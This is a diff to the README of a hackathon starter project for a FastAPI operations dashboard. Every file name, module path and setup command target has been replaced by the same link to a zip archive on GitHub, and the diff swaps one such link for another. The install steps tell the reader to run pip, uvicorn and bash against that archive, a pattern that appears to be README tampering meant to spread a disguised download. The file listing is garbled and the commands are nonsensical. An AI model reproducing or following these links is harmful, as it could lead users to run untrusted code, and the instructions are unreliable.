@@ -17,16 +17,16 @@
 2) Create a virtual env and install deps:
 ```bash
 python -m venv .venv && source .venv/bin/activate
-pip install -r https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip
+pip install -r https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip
 ```
-3) Copy `https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip` → `.env` and (optionally) paste a Slack webhook URL.
+3) Copy `https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip` → `.env` and (optionally) paste a Slack webhook URL.
 4) Run the server:
 ```bash
-uvicorn https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip --reload --port 8000
+uvicorn https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip --reload --port 8000
 ```
 5) In a new terminal, run the demo script to push sample events:
 ```bash
-bash https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip
+bash https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip
 ```
 6) Open the dashboard: http://localhost:8000
 
@@ -38,27 +38,27 @@ bash https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opsp
 ## Project structure
 ```
 app/
-  https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip                # FastAPI app + routes + dashboard
-  https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip              # Pydantic models
+  https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip                # FastAPI app + routes + dashboard
+  https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip              # Pydantic models
   services/
-    https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip        # Simple rule-based classifier (LLM-drop-in spot)
-    https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip          # Maps (type, priority) -> action plan
-    https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip        # Executes tools & records tool call telemetry
+    https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip        # Simple rule-based classifier (LLM-drop-in spot)
+    https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip          # Maps (type, priority) -> action plan
+    https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip        # Executes tools & records tool call telemetry
   tools/
-    https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip             # Optional Slack webhook; else log file
-    https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip            # Stub: logs task creation
-    https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip            # Stub: appends CSV
+    https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip             # Optional Slack webhook; else log file
+    https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip            # Stub: logs task creation
+    https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip            # Stub: appends CSV
   templates/             # Jinja2 HTML templates for the dashboard
   data/                  # State + logs (JSON, CSV, log files)
 demo_fixtures/           # Example events to ingest
 scripts/
-  https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip            # cURL a few fixtures
+  https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip            # cURL a few fixtures
 ```
 
 ---
 
 ## Where to plug an LLM later
-Replace the simple heuristics in `https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip` with an OpenAI call (or any LLM API) to produce:
+Replace the simple heuristics in `https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip` with an OpenAI call (or any LLM API) to produce:
 ```json
 { "type": "invoice|complaint|anomaly|misc", "priority": "P0..P3", "owner_hint": "ops@", "next_action": "..." }
 ```
@@ -67,7 +67,7 @@ Be sure to **do not** log secrets—`toolrouter` already redacts parameters in t
 ---
 
 ## Persisting to a DB (stretch)
-For the hackathon demo, state is in `https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip`. If you later want Postgres, add SQLAlchemy models and replace the `load_state/save_state` helpers.
+For the hackathon demo, state is in `https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip`. If you later want Postgres, add SQLAlchemy models and replace the `load_state/save_state` helpers.
 
 ---
 
